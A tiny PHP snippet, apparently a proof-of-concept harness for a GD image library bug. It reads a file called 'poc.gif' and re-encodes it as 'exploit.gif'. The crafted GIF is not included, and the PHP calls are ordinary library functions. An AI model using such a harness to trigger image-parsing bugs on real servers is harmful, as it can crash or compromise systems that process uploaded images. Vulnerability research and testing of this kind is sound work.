<?php
$gif = imagecreatefromgif('poc.gif');
imagegif($gif, 'exploit.gif');
imagedestroy($gif);
?>
